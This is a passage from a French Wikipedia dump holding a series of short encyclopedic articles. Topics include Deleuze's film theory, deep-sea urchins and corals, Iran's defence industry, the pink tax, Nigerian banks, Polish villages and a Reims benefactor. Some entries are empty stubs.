Gilles Deleuze situe l’arrivée de l’image-temps après la Seconde Guerre mondiale : on ne croit plus à ce principe d’action-réaction. La guerre est une action complexe qui nous dépasse, il n’est pas possible de réagir, de modifier la situation, de la rendre claire. D’où l’apparition de l’image-temps avec le Néo-réalisme italien, puis la Nouvelle Vague française, et la remise en cause du cinéma hollywoodien aux États-Unis. Les Héros de Federico Fellini ("La Dolce Vita") ou de Luchino Visconti ("Mort à Venise") sont désenchantés, ils refusent d’agir, de choisir. Et c'est déjà beaucoup dire qu'ils refusent d'agir. Le schème sensori-moteur se rompt parce que le personnage a vu quelque chose de trop grand pour lui. Deleuze revient constamment sur une image de "Europe 51" de Rossellini : la femme passe devant une usine, s'arrête. « J'ai cru voir des condamnés ». La souffrance est trop forte pour qu'elle continue sa route « comme d'habitude ». L'image-temps vient rompre avec l'Habitude et fait entrer le personnage dans la dimension du temps : « un morceau de temps à l'état pur ». Et c'est cela qui intéresse Deleuze pour son propre compte dans le cinéma, à savoir la manière dont l'image cinématographique peut exprimer un temps qui soit premier par rapport au mouvement. Ce concept de temps est construit par rapport au concept bergsonien de temps et se développe selon deux modalités. Le temps, c'est d'abord le temps présent, ici et maintenant. Mais, selon une seconde modalité, le temps ne cesse pas de se déployer dans deux directions, passée et future. C'est pourquoi Deleuze insiste dans son analyse de Visconti sur le « trop tard ». Dans "Mort à Venise", l'artiste comprend trop tard ce qui a manqué à son œuvre. Alors qu'il est ici et maintenant en train de pourrir, de se décomposer au présent, le personnage comprend en même temps, mais comme dans une autre dimension, dans la lumière aveuglante du soleil sur Tadzio, que la sensualité lui a toujours échappée, que la chair et la terre ont manqué à son œuvre.
Cette conception de l'image-temps amène Deleuze à poser l'assertion suivante : « l'image de cinéma n'est pas au présent ». En effet, si le temps ne cesse pas d'insister, de revenir sur lui-même, et de constituer une mémoire en même temps qu'il passe, alors ce que nous montrent les films, ce sont des zones de la mémoire, des « nappes de passé », qui occasionnellement se concentrent et convergent dans des « pointes de présent ». À cet égard, Orson Welles est bien un des plus grands réalisateurs modernes en tant qu'il a saisi cette dimension mnésique de l'image. "Citizen Kane" est un film construit en mémoire, où chaque section, chaque zone apparaît comme une couche stratifiée qui vient converger ou diverger avec d'autres zones. Chaque « nappe de mémoire » apparaît grâce à l'utilisation de la profondeur de champ faite par Welles : celle-ci, à l'image du temps lui-même, permet d'agencer, dans la même image différents mouvements, différents événements qui forment comme un monde à soi, à l'image du souvenir proustien, duquel Deleuze tire l'expression propre de l'image-temps : « un petit morceau de temps à l'état pur ».
Tout comme le cerveau oscille entre habitude et réflexion, il est bien sûr possible de mélanger les deux images. Reprenons notre homme qui sort de chez lui : l’image mouvement voudrait que le cut survienne quand il passe la porte. Maintenant, la caméra s’attarde une, peut-être deux secondes dans la pièce vide, puis cut, et plan extérieur. L’image-mouvement est pervertie : il y a bien action et réaction, mais le temps ne correspond pas, créant un sentiment de gêne : pourquoi la caméra s’attarde-t-elle dans cette pièce vide où il ne se passe plus rien ? Ou alors il y a action et réaction mais la réaction n’est pas logique. La forme la plus simple de cette liberté d'enchaînement est celle du « faux raccord », tel qu'il est utilisé, par exemple, chez un réalisateur comme Ozu.

</doc>
<doc id="9624575" url="https://fr.wikipedia.org/wiki?curid=9624575" title="Pourtalesia">
Pourtalesia

Pourtalesia est un genre d'oursins irréguliers de la famille des Pourtalesiidae. Oursins abyssaux de forme allongée, leur dénomination constitue un hommage au naturaliste américain Louis François de Pourtalès.
Description et caractéristiques.
Ce sont des oursins très irréguliers, dont la forme a évolué de la sphère vers une forme très allongée, rappelant parfois celle d'une bouteille.
Cet ordre semble être apparu au Miocène, et est répandu principalement en Atlantique nord et Antarctique, avec quelques espèces intertropicales. Dans tous les cas, il est strictement inféodé aux abysses.
Habitat et mode de vie.
Ce sont des oursins abyssaux, et peut-être le genre vivant le plus profond : ils sont inféodés au plus profond des abysses, la zone hadale, et ont été récoltés à plus de de profondeur dans la fosse de Java.
Ils semblent se nourrir à la manière des holothuries, en ingérant la pellicule superficielle du sédiment qui contient une fraction de matière nutritive. 
Liste des espèces.
Selon :

</doc>
<doc id="9624576" url="https://fr.wikipedia.org/wiki?curid=9624576" title="Industrie de la défense de l'Iran">
Industrie de la défense de l'Iran

L’industrie de la défense de l'Iran a fait de grands progrès dans les 25 dernières années , et fabrique maintenant de nombreux types d'armes et d'équipements. Selon les responsables iraniens, le pays a vendu des équipements militaires pour une valeur de de dollars américains en 2003. En 2006, l'Iran avait exporté des armes vers 57 pays.
Composante.
L'industrie militaire de l'Iran, sous le commandement du Ministère de la Défense, est composée des éléments principaux suivants : 
Histoire.
L'industrie militaire de l'Iran est née sous le dernier Shah d'Iran, Mohammad Reza Pahlavi. En 1973, l'Industrie iranienne de l’électronique (IEI) a été fondée pour organiser les efforts pour assembler et réparer les armes importées.
La plupart des armes de l'Iran avant la révolution islamique ont été importés des États-Unis et d'Europe occidentale. Entre 1971 et 1975, le Shah a eu une frénésie d'achats, la commande de 8 milliards de dollars US uniquement dans les armes des États-Unis. Cela a alarmé le Congrès des États-Unis, ce qui a renforcé la loi de 1968 sur les exportations d'armes en 1976 et l'a rebaptisé l'. Pourtant, les États-Unis a continué de vendre de grandes quantités d'armes à l'Iran jusqu'à la Révolution islamique de 1979. 
En 1977, l'organisation des industries de défense a commencé à travailler sur les missiles, conjointement avec Israël et a demandé un programme de développement de missiles conjoint avec les États-Unis qui ont rejeté ce programme. En 1979, le pays a pris la première étape dans la fabrication inspirée de l'ingénierie soviétiques RPG-7, BM21, et de missiles SA-7. Après la révolution islamique et le début de la guerre Iran-Irak, les sanctions économiques et un embargo sur les armes est dirigé par les États-Unis couplé avec une forte demande de matériel militaire ce qui a forcé l'Iran à compter sur son industrie d'armement nationale pour la réparation et de pièces de rechange. Le Corps des Gardiens de la révolution islamique a été chargé de la réorganisation de l'industrie militaire nationale. Sous leur commandement, l'industrie militaire de l'Iran s'est considérablement élargi, et avec le ministère de la Défense versant capitaux dans l'industrie des missiles, l'Iran eut bientôt un arsenal de missiles. Depuis 1992, il a également produit ses propres chars, véhicules blindés, missiles, un sous-marin de poche, et un avion de chasse. En 2007, à la suite des événements dans le programme nucléaire iranien, l'ONU a établi des sanctions contre l'Iran lui interdisant d'exporter toute forme d'armes. En dépit de ces sanctions, l'Iran a vendu des matériels militaires à des pays comme le Soudan, la Syrie, et du la Corée du Nord. L'Iran a également été incapable de continuer à construire son propre système de défense aérienne surnommé Bavar 373. 
Le , le général de brigade iranien Hassan Seifi a rapporté que l'armée iranienne avait atteint l'autosuffisance dans la production de matériel militaire, et que les capacités scientifiques iraniennes ont permis au pays de faire des progrès significatifs dans ce domaine. Il a déclaré : « Contrairement aux pays occidentaux qui cachent leurs nouvelles armes et munitions de tous, [...] l'Armée de l'Iran n'a pas peur d'afficher ses dernières réalisations militaires et tous les pays doivent prendre conscience des progrès de l'Iran dans la production d'armes ».

</doc>
<doc id="9624581" url="https://fr.wikipedia.org/wiki?curid=9624581" title="Industrie militaire iranienne">
Industrie militaire iranienne



</doc>
<doc id="9624582" url="https://fr.wikipedia.org/wiki?curid=9624582" title="Industrie militaire de l'Iran">
Industrie militaire de l'Iran



</doc>
<doc id="9624583" url="https://fr.wikipedia.org/wiki?curid=9624583" title="Pah">
Pah



</doc>
<doc id="9624584" url="https://fr.wikipedia.org/wiki?curid=9624584" title="Ceratophysa">
Ceratophysa

Ceratophysa est un genre d'oursins irréguliers abyssaux de la famille des Pourtalesiidae. 
Description et caractéristiques.
Ce sont des oursins très irréguliers, dont la forme a évolué de la sphère vers une forme triangulaire allongée.
Ce groupe ne se rencontre que dans les profondeurs de l'océan Antarctique.
Liste des espèces.
Selon :

</doc>
<doc id="9624586" url="https://fr.wikipedia.org/wiki?curid=9624586" title="Swanton">
Swanton

Swanton peut faire référence à :

</doc>
<doc id="9624588" url="https://fr.wikipedia.org/wiki?curid=9624588" title="Nasty (chanson)">
Nasty (chanson)



</doc>
<doc id="9624591" url="https://fr.wikipedia.org/wiki?curid=9624591" title="Flabellum australe">
Flabellum australe

Flabellum australe est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624599" url="https://fr.wikipedia.org/wiki?curid=9624599" title="Réserve naturelle régionale du val de Loire Bourbonnais">
Réserve naturelle régionale du val de Loire Bourbonnais

La réserve naturelle régionale du val de Loire Bourbonnais (RNR299) est une réserve naturelle régionale située en Auvergne-Rhône-Alpes. Classée en 2015, elle occupe une surface de et protège un secteur du cours de la Loire.
Localisation.
Le territoire de la réserve naturelle est dans le département de l'Allier, sur les communes de Garnat-sur-Engièvre et Saint-Martin-des-Lais.
Histoire du site et de la réserve.
Le Conservatoire d'espaces naturels de l'Allier impliqué dès 2002 sur le site du « méandre des Germains » est le gestionnaire de la RNR qui se veut un lieu d'expérimentation et un lieu à valeur pédagogique.
Administration, plan de gestion, règlement.
Outils et statut juridique.
La réserve naturelle a été créée par une délibération du Conseil régional du .

</doc>
<doc id="9624601" url="https://fr.wikipedia.org/wiki?curid=9624601" title="Taxe rose">
Taxe rose

La taxe rose, en anglais pink tax ou woman tax, est une différence de prix entre les produits et services étiquetés pour femme et ceux étiquetés pour homme, au détriment des consommatrices. Il ne s'agit donc pas d'une taxe au sens propre du terme : le nom provient du fait que le produit pour femme est souvent présenté dans un emballage de couleur rose, cette couleur pouvant représenter la seule différence avec le produit pour homme. L'existence d'une différence de prix tous produits confondue n'est pas prouvée. Une taxe rose existe sur des produits spécifiques, tels que les gels douche, les déodorants et les rasoirs, dans un contexte où d'autre produits sont plus chers dans leur version masculine. 
La campagne de revendication autour de la taxe tampon, très proche, pose la question de savoir si les tampons et serviettes hygiéniques doivent être considérés comme des produits de première nécessité, dans la mesure où ils sont indispensables à l'hygiène féminine, et donc bénéficier de taux réduits pour l’application des taxes sur la consommation.
Histoire.
Vers 1950, à la suite de la Seconde Guerre mondiale et de la Grande Noirceur, on voit apparaître un nouveau mode social, l’"American way of life", qui est basé sur la consommation de masse. D'autant plus à l’époque de ce bouleversement, souvent les femmes étaient au foyer mais se chargeaient des achats. Les entreprises ont vu une opportunité de faire plus de profits, en créant des produits qui attireraient plus les femmes, entre autres par l’odeur, l’emballage, ou la couleur et les vendre plus cher. Les premiers écarts de prix apparaissent alors.
La notion de « taxe rose » est apparue dans les années 1990 en Californie, sous le nom de "woman tax". En 1996, l'État légifère pour interdire cette pratique. En 2012, une enquête du magazine "Forbes" permet de conclure qu'être une femme aux États-Unis coûte en moyenne de plus par an par rapport à un homme, à cause de la politique de prix basée sur le marketing genré. En 2013, un coiffeur danois est condamné pour discrimination en raison de la différence de prix qu'il applique en fonction du sexe, même si la longueur de cheveux est la même. En France, le collectif Georgette Sand interpelle Bercy sur ces différences de prix à la fin de l'année 2014, en mettant en cause (entre autres) la marque Monoprix.
Notion de « taxe tampon ».
En 2014, le Canada supprime les taxes sur les produits d'hygiène intime féminine. Le débat gagne la plupart des pays anglo-saxons.
Aux États-Unis, la taxe sur les produits hygiéniques persiste. Le gouvernement Californien affirme qu’ils récoltent 20 millions de dollars par années pour les taxes sur les produits menstruels .
Fin 2015, cette polémique autour de la « taxe tampon » éclate en France. Le collectif Georgette Sand propose de baisser la TVA applicable aux protections périodiques pour femmes, tampons et serviettes hygiéniques, de 20 % à 5,5 %, en les considérant comme des produits de première nécessité. Pour le collectif féministe, les protections périodiques sont le produit de consommation courant qui crée la plus importante inégalité homme-femme, en raison de leur prix. Si la demande est soutenue par la députée Catherine Coutelle, le député Christian Eckert s'oppose à la baisse de la TVA, faisant valoir que les mousses à raser sont taxées à 20 %, et que les lunettes ne sont pas considérées comme un produit de première nécessité. Une pétition rassemble plus de , la loi est rejetée en première lecture par l'Assemblée. La loi a finalement été adoptée en France en , en seconde lecture auprès du parlement.
Produits et services concernés.
De nombreux produits (rasoirs, déodorants, dentifrices et même stylos…) et services sont concernés par ces différences de prix en fonction du sexe. Les coiffeurs et les pressings, par exemple, proposent généralement des tarifs plus élevés aux femmes, même pour des cheveux courts ou des vêtements semblables à ceux des hommes. Ces différences de prix peuvent atteindre les 100 %. Généralement, les vêtements pour jeunes filles coûtent 4% de plus que ceux pour garçons, les femmes paient 7% de plus pour les accessoires, 8% de plus pour les vêtements et 13% de plus pour les produits de soins et d’hygiène. En 2012, la compagnie BIC sort une collection pour femmes (BIC for her pens). La seule différence notable étant le nom, l’emballage et la couleur rose, le prix était 70% plus cher qu’un crayon unisexe, mais la production demandait un montant identique. Au Vermont, le coût moyen de lavage à sec pour un chandail pour hommes est de 2.06$ en comparaison de 3,95 $ pour un chandail pour femmes .
Avis nuancés.
Interrogés sur cette pratique, les experts en marketing expliquent que le but est de donner aux femmes le sentiment d'être des clientes à part, et que la segmentation des marchés représente une pratique normale. En 2015, une agence de data-journalisme remet en cause la notion même de « taxe rose », estimant qu'il existe aussi des produits spécifiques aux hommes plus chers que les produits pour femmes. L'enseigne Monoprix, mise en cause pour ses produits, a affirmé que les coûts de production des produits féminins sont plus élevés que ceux des produits masculins.
Analyses systémiques.
Rapport de la DGCCRF de 2015.
En France, à la suite de la campagne de sensibilisation lancée par le Collectif Georgette Sand, le gouvernement est invité à se pencher sur le sujet. Le collectif est reçu fin 2014 par la secrétaire d’État aux Droits des femmes, Pascale Boistard. En conclusion des efforts de l'association, une enquête est finalement commandée à la Direction Générale de la Concurrence, de la Consommation et la Répression des Fraudes (DGCCRF), et un rapport publié le .
Le rapport conclut négativement quant à l'existence d'un surcoût concernant les produits marketés comme féminins, comparés aux équivalents masculins.
Présentant le résultat de cette enquête au Parlement, Pascale Boistard considère que le phénomène existe bel et bien, quoique plus complexe et moins systématique que présenté initialement.
Analyse de Moshary et al. en 2021.
L'existence ou non d'une taxe rose est de nouveau analysée en 2021. Les chercheuses soulignent une difficulté à évaluer objectivement des différences de prix entre produits en raison de possibles différences dans leur composition.
Sur les neuf catégories de produits analysées dans l'étude, seules quatre montrent des prix plus élevés des produits pour femmes : le pain de savon, les gels douche, les déodorants, et les rasoirs. Dans trois catégories de produits, celui pour homme était plus cher à l'achat que celui pour femme. Elles en concluent que l'existence d'une taxe rose systématique n'est pas prouvée.

</doc>
<doc id="9624603" url="https://fr.wikipedia.org/wiki?curid=9624603" title="Chiquitunga">
Chiquitunga



</doc>
<doc id="9624604" url="https://fr.wikipedia.org/wiki?curid=9624604" title="District de Kishanganj">
District de Kishanganj

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte . Son chef-lieu est la ville de Kishanganj. 

</doc>
<doc id="9624608" url="https://fr.wikipedia.org/wiki?curid=9624608" title="District de Supaul">
District de Supaul

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Supaul. 

</doc>
<doc id="9624615" url="https://fr.wikipedia.org/wiki?curid=9624615" title="Taxe tampon">
Taxe tampon



</doc>
<doc id="9624617" url="https://fr.wikipedia.org/wiki?curid=9624617" title="First Bank of Nigeria">
First Bank of Nigeria

First Bank of Nigeria, aussi appelée FirstBank, est une banque du Nigeria, basée à Lagos.
Histoire.
Elle est fondée en 1894 sous le nom de Bank of British West Africa (BBWA). En 1896, la banque rachète l'African Banking Corporation, et l'Anglo-African Bank en 1912.
En 1957, la banque change de nom et devient Bank of West Africa (BWA). L'indépendance du Nigéria en 1960 permet à la banque d'étendre ses activités sur la banque de détail. La banque dispose alors de 114 agences à-travers le pays.
En 1966, la banque change de nom et devient Standard Bank of West Africa à la suite de sa fusion avec la Standard Bank. En 1971, la banque est listée sur le Nigerian Stock Exchange (NSE), ouvrant une partie de son capital au public.
La banque prend son nom actuel de First Bank of Nigeria en 1979.
En 1982, une agence est ouverte à Londres. En 1991, la banque établit ses premiers guichets automatiques.
En 2002, la First Bank of Nigeria établit la FBN Bank au Royaume-Uni et devient la première banque nigériane à posséder entièrement une banque active et régulée sur les marchés britanniques.
En octobre 2011, la Banque International de Crédit (BIC), propriété des Israéliens Beny Steinmetz et Dan Gertler depuis 2008, est cédée à la First Bank of Nigeria.
En septembre 2014, First Bank of Nigeria acquiert 5 filiales d'International Continental Bank, une banque malaisienne, situées au Ghana, au Sierra Leone, au Sénégal, en Guinée et en Gambie pour un montant estimé à 150 millions de dollars. Dès 2015, la direction du groupe place des directeurs nigérians à la tête des filiales internationales pour en reprendre le contrôle.
En avril 2016, FirstBank annonce des résultats catastrophiques sur l'exercice de l'année 2015, une chute de 82 % des bénéfices par rapport à l'année précédente, un mauvais résultat qui s'explique par le chute du prix du pétrole et la déroute financière du pays. La banque décide alors de réduire ses effectifs en licenciant 1000 employés.
Controverses.
En 2015, le CEO Stephen Olabisi Onasanya, en poste depuis 6 ans, est épinglé pour son implication directe dans le détournement de millions de dollars pour le compte du gouverneur de l'état de Bayelsa, Seriake Dickson.
En mai 2016, Dauda Lawal, directeur des affaires publiques du groupe bancaire, est arrêté par les autorités des crimes financiers du Nigéria pour avoir participé au blanchiment de pour le compte de Diezani Alison-Madueke.

</doc>
<doc id="9624619" url="https://fr.wikipedia.org/wiki?curid=9624619" title="Old Road Football Club">
Old Road Football Club

Old Road Football Club est un club de football antiguais basé à Old Road, au sud de l'île d'Antigua.
Histoire.
Fondé à Old Road, il joue en "Premier Division". Il compte à son palmarès deux championnats. Malgré ses deux titres nationaux, le club n'a jusqu'à présent jamais participé à une compétition continentale, en raison des critères de sélection des clubs antiguais pour la CFU Club Championship.
Le milieu offensif Gayson Gregory a porté les couleurs du club durant une saison, en 2009-2010.

</doc>
<doc id="9624640" url="https://fr.wikipedia.org/wiki?curid=9624640" title="Rooz">
Rooz

Rooz (persan: روز, littéralement jour) est un site Web d'actualités en persan et en anglais. Il est surtout composé de journalistes iraniens en exil, parmi lesquels Massoud Behnoud, Ebrahim Nabavi et Nikahang Kowsar ainsi que de militants et journalistes à l'intérieur de l'Iran, parmi lesquels Shirin Ebadi et Ahmad Zeidabadi. Un autre contributeur est Hossein Derakhshan, en état d'arrestation à Téhéran depuis le .
Il fut d'abord publié sur le Web le . Il l'est aujourd'hui par "L'Iran Gooya" (enregistré en France).
Controverse.
Les critiques iraniennes du site affirment que Rooz ne va pas dans l'intérêt de leur nation, et ne représente pas l'exactitude factuelle des événements.
Leur raisonnement est basé sur le financement du site par Hivos,
En , Hossein Derakhshan qui a maintenu le site Rooz affirmé sur son blog qu'il a été accusée de travailler pour le gouvernement de la République islamique et qu'iln'a donc pas été payé par Rooz pendant une année.
En outre, il espérait que Hivos, une organisation néerlandaise qui contribue au financement de Rooz, ferait pression pour permettre une plus grande liberté d'expression à leur personnel.
Nikahang Kowsar affirmé que Derakhshan a pris le site «otage» et qu'il exige une «rançon».

</doc>
<doc id="9624645" url="https://fr.wikipedia.org/wiki?curid=9624645" title="Fujino">
Fujino



</doc>
<doc id="9624646" url="https://fr.wikipedia.org/wiki?curid=9624646" title="Raz de marée de mars 709">
Raz de marée de mars 709



</doc>
<doc id="9624648" url="https://fr.wikipedia.org/wiki?curid=9624648" title="Flabellum campanulatum">
Flabellum campanulatum

Flabellum campanulatum est une espèce de coraux de la famille des Flabellidae.
Répartition.
Dans sa description originale, l'auteur indique que le spécimen analysé provenait des Philippines.

</doc>
<doc id="9624652" url="https://fr.wikipedia.org/wiki?curid=9624652" title="Emi Fujino">
Emi Fujino

, née le dans la préfecture d'Aichi au Japon, est une pratiquante japonaise d'arts martiaux mixtes (MMA).

</doc>
<doc id="9624661" url="https://fr.wikipedia.org/wiki?curid=9624661" title="Flabellum chunii">
Flabellum chunii

Flabellum chunii est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624663" url="https://fr.wikipedia.org/wiki?curid=9624663" title="Le Vertige (film, 1926)">
Le Vertige (film, 1926)

Le Vertige est un film français réalisé par Marcel L'Herbier et sorti en 1926.
Synopsis.
À Pétrograd au début de la révolution russe, le général Svirsky a abattu Dimitrieff, l'amant de sa femme Natacha. Émigrée à Nice, Natacha Svirsky rencontre Henri de Cassel, portrait vivant du disparu. Pleine d'effroi, elle devient néanmoins sa maîtresse.
Tournage.
Le tournage a eu lieu au studio Éclair à Épinay-sur-Seine (aujourd’hui en Seine-Saint-Denis) et studios de Saint-Laurent-du-Var (Alpes-Maritimes).
Innovation technique.
Marcel L'Herbier utilise pour son tournage une caméra gyroscopique, « Caméréclair spécial ». Marcel L'Herbier décrit ses qualités : 

</doc>
<doc id="9624670" url="https://fr.wikipedia.org/wiki?curid=9624670" title="Rugby à cinq">
Rugby à cinq



</doc>
<doc id="9624671" url="https://fr.wikipedia.org/wiki?curid=9624671" title="Place Amélie-Doublié">
Place Amélie-Doublié

La place Amélie-Doublié est une place de la ville de Reims en France.
Situation et accès.
Elle est reliée à la rue du Docteur-Thomas, la rue Victor-Rogelet et la rue Mennesson-Tonnelier. En son centre se trouve une aire de jeux et elle est bordée d'une haie d'arbres.
Origine du nom.
Elle porte le nom d'Amélie Doublié, bienfaitrice de la ville.
Historique.
Elle avait autrefois en son centre un kiosque à musique.
Notes et références.
Articles connexes.
Liste des voies de Reims.

</doc>
<doc id="9624672" url="https://fr.wikipedia.org/wiki?curid=9624672" title="(4035) Thestor">
(4035) Thestor

(4035) Thestor est un astéroïde troyen de Jupiter.
Description.
(4035) Thestor est un astéroïde troyen de Jupiter. Il fut découvert le à Toyota par Kenzo Suzuki et Takeshi Urata. Il présente une orbite caractérisée par un demi-grand axe de 5,284 UA, une excentricité de 0,056 et une inclinaison de 12,1323° par rapport à l'écliptique.

</doc>
<doc id="9624678" url="https://fr.wikipedia.org/wiki?curid=9624678" title="Flabellum conuis">
Flabellum conuis

Flabellum conuis est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624679" url="https://fr.wikipedia.org/wiki?curid=9624679" title="Kolonia Pliszczyn">
Kolonia Pliszczyn

Kolonia Pliszczyn (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Il se situe à environ au nord-est de Lublin (siège du powiat et capitale de la voïvodie).
Le village comptait approximativement une population de 402 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624682" url="https://fr.wikipedia.org/wiki?curid=9624682" title="Kolonia Świdnik Mały">
Kolonia Świdnik Mały

Kolonia Świdnik Mały (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Le village comptait approximativement une population de 234 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624683" url="https://fr.wikipedia.org/wiki?curid=9624683" title="HK Kiev">
HK Kiev



</doc>
<doc id="9624686" url="https://fr.wikipedia.org/wiki?curid=9624686" title="Flabellum curvatum">
Flabellum curvatum

Flabellum curvatum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624692" url="https://fr.wikipedia.org/wiki?curid=9624692" title="Flabellum daphnense">
Flabellum daphnense

Flabellum daphnense est une espèce de coraux de la famille des Flabellidae.
Taxonomie.
Pour le "WoRMS", le nom valide de cette espèce est "Flabellum (Ulocyathus) daphnense" précisant ainsi le sous-genre auquel elle appartient.

</doc>
<doc id="9624697" url="https://fr.wikipedia.org/wiki?curid=9624697" title="Amélie Doublié">
Amélie Doublié

Marie Amélie Joséphine Doublié, née le à Bétheny et morte le à Reims, est la fondatrice de la première école ménagère de France.
Biographie.
Amélie Doublié est née le à Bétheny, elle est la fille de Joseph Doublié (1799-1873) qui possédait de nombreux terrains entre Reims et Bétheny qui se couvrirent au de maisons, rues et entreprises.
En 1873, elle fonda avec son époux, le médecin Octave Doyen, la première école professionnelle et ménagère de jeunes filles ; l'école fut reprise par la ville, puis déménagée rue des Boucheries en 1880, elle avait deux cents élèves à l'entrée de la Grande Guerre. Elle avait aussi écrit un manuel pour l'éducation des filles. Elle reçut un diplôme d'honneur des Sociétés mutuelles de Reims. Les époux fondèrent aussi un prix Doublié-Doyen pour un ouvrier méritant.
Morte le 12 mai 1878 à Reims, elle repose avec son époux au cimetière du Nord. Ils sont les parents du chirurgien Eugène Doyen.
La ville de Reims lui a dédié une place Amélie-Doublié.

</doc>
<doc id="9624699" url="https://fr.wikipedia.org/wiki?curid=9624699" title="Flabellum deludens">
Flabellum deludens

Flabellum deludens est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624703" url="https://fr.wikipedia.org/wiki?curid=9624703" title="Zenith Bank">
Zenith Bank

Zenith Bank Plc est un prestataire de services financiers au Nigéria et en Afrique de l'Ouest anglophone. Son siège social est situé à Victoria Island, à Lagos. Elle est agréée comme banque commerciale par la Banque centrale du Nigéria, l'autorité nationale de régulation bancaire. 
Au avril 2024, elle détenait un actif total de plus de 16,5 milliards de dollars, avec des capitaux propres de 854 millions de dollars. La société est cotée à la Bourse du Nigéria et à la Bourse de Londres. Malgré l'inflation actuelle au Nigéria, la banque a enregistré un bénéfice avant impôts (BAI) de 727,03 milliards de nairas au premier semestre 2024. Elle a remporté les prix de la « Banque de l'année » et de la « Banque de détail de l'année » lors des BAFI Awards en octobre 2024.
Histoire.
En 1990, Jim Ovia a fondé Zenith Bank plc pour concurrencer les quatre grandes banques existantes. Zenith Bank a été créée en mai 1990 et a commencé ses activités bancaires en juillet de la même année. À sa création, elle disposait d'un capital de 4 millions de dollars. Elle a commencé ses activités pendant la période de libéralisation du secteur bancaire par le gouvernement, lorsque la banque centrale a accordé jusqu'à vingt licences bancaires par an aux investisseurs. Le premier bureau de la banque était à l'origine une maison résidentielle sur l'île Victoria, transformée en salle bancaire.
Le 17 juin 2004, après une introduction en bourse réussie, la banque est devenue une société anonyme. Le 21 octobre 2004, ses actions ont été cotées à la Bourse du Nigeria (NGX). Les actions de la banque sont cotées à la Bourse de Londres (LSE) depuis l'introduction en bourse de 850 millions de dollars de ses actions à 6,80 dollars chacune, en 2013.
Operations.
En 2016, Zenith Bank comptait plus de 500 succursales et bureaux dans tous les États et le Territoire de la capitale fédérale. Elle possède des filiales au Royaume-Uni, aux Émirats arabes unis, au Ghana, en Sierra Leone et en Gambie. La banque possède également un bureau en Chine.

</doc>
<doc id="9624706" url="https://fr.wikipedia.org/wiki?curid=9624706" title="Pierre-Thomas Philippe">
Pierre-Thomas Philippe



</doc>
<doc id="9624713" url="https://fr.wikipedia.org/wiki?curid=9624713" title="Flabellum flexuosum">
Flabellum flexuosum

Flabellum flexuosum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624720" url="https://fr.wikipedia.org/wiki?curid=9624720" title="Christophe Labarde">
Christophe Labarde

Christophe Labarde, né le à Pau (Pyrénées-Atlantiques), est un journaliste, auteur et entrepreneur français. 
Grand reporter au "Figaro", cofondateur du magazine "Médias", conseiller spécial de François Bayrou (1993-1997), dirigeant d'associations (Association des diplômés HEC aujourd'hui appelée HEC Alumni), il préside par ailleurs (depuis 2012) les Ateliers Labarde, une société de conseils en images dont il est le fondateur. Il est également le fondateur et l'éditeur de la revue "La compagnie de Lazare".
Entre 2016 et 2021, il a été directeur général de la French-American Foundation - France.
Biographie.
Christophe Labarde est diplômé de l’École des hautes études commerciales de Paris (HEC) en 1984 et titulaire du certificat d'aptitude à la profession de conseil.
Carrière.
Journalisme.
Christophe Labarde entre au "Figaro" en 1987, où il devient grand reporter au service « économie internationale », fonction qu'il occupe jusqu'en 1993.
En 1991, il réalise une exclusivité en interviewant de l'ancien secrétaire d'État américain Robert McNamara, qui préconise une diminution drastique de l'arsenal nucléaire mondial, au profit d'une aide massive à l'ex-URSS ("Le Figaro", vendredi 20 septembre 1991).
En 1997, il devient rédacteur en chef adjoint de l'hebdomadaire "L'Européen" aux côtés de Christine Ockrent. En 2001, il cofonde le magazine "Médias", dont il sera membre du comité de rédaction jusqu'en 2012. En 2015, il fonde la revue "La compagnie de Lazare".
Lobbying et relations publiques.
De 1999 à 2001, il est directeur de la communication et des relations publiques de l'Association générale des producteurs de maïs (AGPM) et de la Confédération européenne des producteurs de maïs (CEPM). En 2012, Christophe Labarde fonde une société spécialisée dans le conseil en images, la production et la réalisation de films « sur mesure ». 
Politique.
Christophe Labarde a été conseiller spécial de François Bayrou, président du conseil général des Pyrénées-Atlantiques, ministre de l’Éducation nationale, de l'Enseignement supérieur et de la Recherche, de 1993 à 1997.
Lien avec HEC.
En 2000, il devient président du forum de prospective managériale « Futuract HEC ». Il est par ailleurs administrateur de la Fondation HEC de 2001 à 2008, délégué général, puis directeur général de l'Association des diplômés HEC de 2001 à 2010.

</doc>
<doc id="9624735" url="https://fr.wikipedia.org/wiki?curid=9624735" title="Héctor Colomé">
Héctor Colomé

Héctor Colomé, né le à Córdoba en Argentine et mort le à Madrid, est un acteur hispono-argentin.
Biographie.
Il meurt le à la clinique Ruber de Mirasierra à Madrid d'un cancer du pancréas.

</doc>
<doc id="9624739" url="https://fr.wikipedia.org/wiki?curid=9624739" title="Łuszczów Drugi">
Łuszczów Drugi

Łuszczów Drugi (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Il se situe à environ à l'est de Jakubowice Murowane (siège de la "gmina") et à l'est de Lublin (siège du "powiat" et capitale de la voïvodie).
Le village comptait approximativement une population de 687 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9624740" url="https://fr.wikipedia.org/wiki?curid=9624740" title="Ouvrage de la Séréna">
